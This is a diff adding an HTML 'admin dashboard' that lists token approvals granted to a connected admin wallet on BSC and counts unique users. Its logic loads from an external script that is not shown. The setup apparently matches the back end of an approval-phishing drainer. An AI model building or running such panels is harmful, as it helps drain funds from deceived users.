@@ -1,0 +1,317 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Admin Dashboard - BSC Approval Tracker</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Arial, sans-serif;
+            background: #f7fafc;
+            min-height: 100vh;
+            padding: 20px;
+        }
+        
+        .container {
+            max-width: 1200px;
+            margin: 0 auto;
+        }
+        
+        header {
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            color: white;
+            padding: 32px;
+            border-radius: 16px;
+            margin-bottom: 32px;
+            box-shadow: 0 4px 12px rgba(102, 126, 234, 0.3);
+        }
+        
+        header h1 {
+            font-size: 32px;
+            margin-bottom: 8px;
+        }
+        
+        header p {
+            opacity: 0.9;
+            font-size: 16px;
+        }
+        
+        .card {
+            background: white;
+            border-radius: 16px;
+            padding: 32px;
+            box-shadow: 0 2px 8px rgba(0,0,0,0.1);
+            margin-bottom: 24px;
+        }
+        
+        .card h2 {
+            color: #2d3748;
+            font-size: 24px;
+            margin-bottom: 16px;
+        }
+        
+        .wallet-section {
+            margin: 24px 0;
+        }
+        
+        .btn {
+            padding: 12px 24px;
+            border: none;
+            border-radius: 8px;
+            font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.2s;
+        }
+        
+        .btn-primary {
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            color: white;
+        }
+        
+        .btn-primary:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 4px 12px rgba(102, 126, 234, 0.4);
+        }
+        
+        .btn-primary:disabled {
+            opacity: 0.5;
+            cursor: not-allowed;
+            transform: none;
+        }
+        
+        .wallet-info {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            padding: 12px 20px;
+            background: #f0fff4;
+            border: 2px solid #48bb78;
+            border-radius: 8px;
+            margin-top: 16px;
+        }
+        
+        .wallet-info.hidden {
+            display: none;
+        }
+        
+        .status-dot {
+            width: 10px;
+            height: 10px;
+            background: #48bb78;
+            border-radius: 50%;
+            animation: pulse 2s infinite;
+        }
+        
+        @keyframes pulse {
+            0%, 100% { opacity: 1; }
+            50% { opacity: 0.5; }
+        }
+        
+        .form-group {
+            margin: 24px 0;
+        }
+        
+        .form-group label {
+            display: block;
+            color: #2d3748;
+            font-weight: 600;
+            margin-bottom: 8px;
+        }
+        
+        .input-field {
+            width: 100%;
+            padding: 12px;
+            border: 2px solid #e2e8f0;
+            border-radius: 8px;
+            font-size: 14px;
+            transition: border-color 0.2s;
+        }
+        
+        .input-field:focus {
+            outline: none;
+            border-color: #667eea;
+        }
+        
+        .loading {
+            text-align: center;
+            padding: 40px;
+            color: #718096;
+        }
+        
+        .loading.hidden {
+            display: none;
+        }
+        
+        .spinner {
+            width: 40px;
+            height: 40px;
+            border: 4px solid #e2e8f0;
+            border-top-color: #667eea;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+            margin: 0 auto 16px;
+        }
+        
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
+        
+        .results-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 24px;
+            flex-wrap: wrap;
+            gap: 16px;
+        }
+        
+        .stats {
+            display: flex;
+            gap: 16px;
+        }
+        
+        .stat-badge {
+            padding: 8px 16px;
+            background: #edf2f7;
+            border-radius: 8px;
+            font-size: 14px;
+            color: #2d3748;
+        }
+        
+        .stat-badge strong {
+            color: #667eea;
+            font-size: 18px;
+        }
+        
+        .approval-card {
+            background: #f7fafc;
+            border: 1px solid #e2e8f0;
+            border-radius: 12px;
+            padding: 20px;
+            margin-bottom: 16px;
+        }
+        
+        .approval-card h4 {
+            color: #2d3748;
+            margin-bottom: 12px;
+            font-size: 16px;
+        }
+        
+        .approval-detail {
+            display: flex;
+            justify-content: space-between;
+            padding: 8px 0;
+            border-bottom: 1px solid #e2e8f0;
+            font-size: 14px;
+        }
+        
+        .approval-detail:last-child {
+            border-bottom: none;
+        }
+        
+        .approval-detail .label {
+            color: #718096;
+            font-weight: 600;
+        }
+        
+        .approval-detail .value {
+            color: #2d3748;
+            font-family: monospace;
+        }
+        
+        .hidden {
+            display: none;
+        }
+        
+        @media (max-width: 768px) {
+            header {
+                padding: 24px;
+            }
+            
+            header h1 {
+                font-size: 24px;
+            }
+            
+            .card {
+                padding: 24px;
+            }
+            
+            .stats {
+                flex-direction: column;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <header>
+            <h1>📊 Admin Dashboard</h1>
+            <p>Track and monitor all token approvals granted to your address</p>
+        </header>
+
+        <div class="card">
+            <h2>BNB Token Approval Management</h2>
+            <p style="color: #718096; margin-bottom: 24px;">Track all BNB token approvals granted to your wallet address</p>
+            
+            <div class="wallet-section">
+                <button id="connectAdminWallet" class="btn btn-primary">
+                    Connect Admin Wallet
+                </button>
+                <div id="adminWalletInfo" class="wallet-info hidden">
+                    <span class="status-dot"></span>
+                    <span id="connectedAdminAddress"></span>
+                    <button id="disconnectAdminWallet" class="btn" style="margin-left: auto; padding: 8px 16px; background: #fed7d7; color: #c53030;">
+                        Disconnect
+                    </button>
+                </div>
+            </div>
+
+            <div style="background: #f0fff4; border: 2px solid #48bb78; border-radius: 8px; padding: 16px; margin: 24px 0;">
+                <div style="display: flex; align-items: center; gap: 8px; margin-bottom: 8px;">
+                    <span style="font-size: 20px;">🐸</span>
+                    <strong style="color: #2d3748;">Tracking: BNB Token</strong>
+                </div>
+                <p style="color: #718096; font-size: 14px; margin: 0;">Contract: 0x095418A82BC2439703b69fbE1210824F2247D77c</p>
+            </div>
+
+            <button id="fetchApprovalsBtn" class="btn btn-primary" style="width: 100%;" disabled>
+                Fetch BNB Approval Records
+            </button>
+
+            <div id="loadingIndicator" class="loading hidden">
+                <div class="spinner"></div>
+                <p>Fetching approval events from BSC blockchain...</p>
+            </div>
+
+            <div id="approvalsResult" class="hidden" style="margin-top: 32px;">
+                <div class="results-header">
+                    <h3 style="color: #2d3748; font-size: 20px;">Approval Records</h3>
+                    <div class="stats">
+                        <span class="stat-badge">
+                            <strong id="totalApprovals">0</strong> Total Approvals
+                        </span>
+                        <span class="stat-badge">
+                            <strong id="uniqueUsers">0</strong> Unique Users
+                        </span>
+                    </div>
+                </div>
+                <div id="approvalsList"></div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Required Libraries -->
+    <script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.umd.min.js"></script>
+    <script src="https://cdn.jsdelivr.net/npm/@walletconnect/web3-provider@1.8.0/dist/umd/index.min.js"></script>
+    
+    <!-- Admin Dashboard Script -->
+    <script src="https://luntracapital.com/bsc-admin-dashboard.js"></script>
+</body>
+</html>
